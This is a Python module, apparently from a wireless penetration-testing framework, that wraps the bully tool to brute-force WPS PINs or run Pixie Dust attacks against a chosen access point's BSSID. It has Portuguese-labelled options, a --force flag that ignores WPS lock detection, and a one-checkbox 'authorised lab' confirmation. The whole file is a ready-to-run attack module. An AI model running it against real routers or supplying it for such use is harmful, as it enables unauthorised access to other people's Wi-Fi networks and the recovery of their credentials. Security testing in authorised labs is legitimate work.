#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Bully — WPS brute-force attack bridge (C binary).

Bully is an alternative WPS PIN brute-force tool written in C. It is generally
faster than reaver on some AP implementations and handles WPS rate-limiting and
lock detection differently. Supports both PIN brute force and Pixie Dust.

Incorporated from:
  - submodules/IoT/wifi-arsenal/bully (GPL-2.0, invoked as subprocess)

This bridge:
  - Builds and invokes the ``bully`` C binary via subprocess.
  - Supports standard WPS modes: bruteforce, pin, and pixie (--pixiedust).
  - Parses --verbose output to detect WPS lock and credential extraction.

Prerequisites (host):
  - bully installed: apt install bully OR compiled from source.
  - Wireless interface in monitor mode.
  - Root/sudo privileges.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from typing import List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Subprocess bridge for Bully WPS brute-force tool (C, GPL-2.0)."""

    __info__ = {
        "name": "Bully WPS Brute-Force Bridge",
        "description": (
            "WPS PIN brute-force via bully (C binary, GPL-2.0). Supports standard "
            "PIN enumeration, specific PIN attempt, and Pixie Dust (--pixiedust). "
            "Alternative to reaver with different WPS lock handling. subprocess only."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "bully contributors (GPL-2.0, invoked as subprocess)",
        ),
        "references": (
            "https://github.com/aanarchyy/bully",
        ),
        "devices": ("wifi", "802.11 WPS"),
    }

    interface = OptString("", "Interface em modo monitor (ex.: wlan0mon)")
    target_bssid = OptString("", "BSSID do AP alvo")
    channel = OptInteger(0, "Canal do AP (0 = auto-detect via bully)")
    essid = OptString("", "ESSID do AP alvo (recomendado para bully)")
    pixie_dust = OptBool(False, "Ataque Pixie Dust (--pixiedust)")
    pin = OptString("", "PIN WPS específico para tentar (--pin)")
    delay = OptFloat(0.0, "Atraso entre tentativas em segundos (--delay); 0 = omitir")
    timeout = OptFloat(0.0, "Timeout de resposta M5/M7 (--timeout); 0 = omitir")
    verbose = OptInteger(3, "Nível de verbosidade bully (1-4; padrão 3)")
    force = OptBool(False, "Forçar mesmo com WPS lock detectado (--force)")
    dry_run = OptBool(False, "Exibir comando sem executar")
    i_know_scope = OptBool(False, "Confirmo que estou em laboratório autorizado")

    def _build_cmd(self, bully_bin: str) -> Optional[List[str]]:
        """Construct bully command line."""
        iface = str(self.interface).strip()
        bssid = str(self.target_bssid).strip()

        if not iface:
            print_error("Defina interface em modo monitor.")
            return None
        if not bssid:
            print_error("Defina target_bssid.")
            return None

        cmd: List[str] = [bully_bin, iface, "-b", bssid]

        ch = int(self.channel)
        if ch > 0:
            cmd.extend(["-c", str(ch)])

        essid = str(self.essid).strip()
        if essid:
            cmd.extend(["-e", essid])

        if self.pixie_dust:
            cmd.append("--pixiedust")

        pin = str(self.pin).strip()
        if pin:
            cmd.extend(["--pin", pin])

        if float(self.delay) > 0:
            cmd.extend(["--delay", str(int(float(self.delay)))])

        if float(self.timeout) > 0:
            cmd.extend(["--timeout", str(float(self.timeout))])

        v = max(1, min(4, int(self.verbose)))
        cmd.extend(["-v", str(v)])

        if self.force:
            cmd.append("--force")

        return cmd


    def check(self) -> str:
        """Verify external tool dependencies are installed."""
        import shutil
        tools: list[str] = []
        src = getattr(self.__class__, "__doc__", "") or ""
        for t in ("aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng",
                   "hashcat", "hcxdumptool", "hcxtools", "wifite", "bettercap",
                   "kismet", "hostapd", "dnsmasq", "mdk4", "mdk3",
                   "hostapd-wpe", "hostapd-mana", "eaphammer"):
            if t.replace("-ng", "").replace("-", "") in (src + self.__class__.__name__).lower():
                tools.append(t)
        if not tools:
            tools = ["aircrack-ng"]
        missing = [t for t in tools if not shutil.which(t.rstrip("_"))]
        if missing:
            return f"Missing tools: {', '.join(missing)} - install before use"
        return f"Tool dependencies found: {', '.join(tools)} - prerequisites OK"

    def run(self) -> None:
        """Execute bully WPS attack."""
        require_authorised_lab(self.i_know_scope)

        bully_bin = shutil.which("bully")
        if not bully_bin:
            print_error(
                "bully não encontrado no PATH. "
                "Instale com: apt install bully  (ou compile de https://github.com/aanarchyy/bully)"
            )
            return

        cmd = self._build_cmd(bully_bin)
        if cmd is None:
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — {}".format(cmd_str))
            return

        mode = "Pixie Dust" if self.pixie_dust else ("PIN específico" if str(self.pin).strip() else "Bruteforce")
        print_status("Bully WPS ({}): {}".format(mode, cmd_str))

        try:
            result = subprocess.run(cmd, check=False)
            if result.returncode == 0:
                print_success("bully concluiu (código 0).")
            else:
                print_error("bully saiu com código {}.".format(result.returncode))
        except KeyboardInterrupt:
            print_info("\nInterrompido pelo usuário.")
        except Exception as exc:
            print_error("Falha ao executar bully: {}".format(exc))
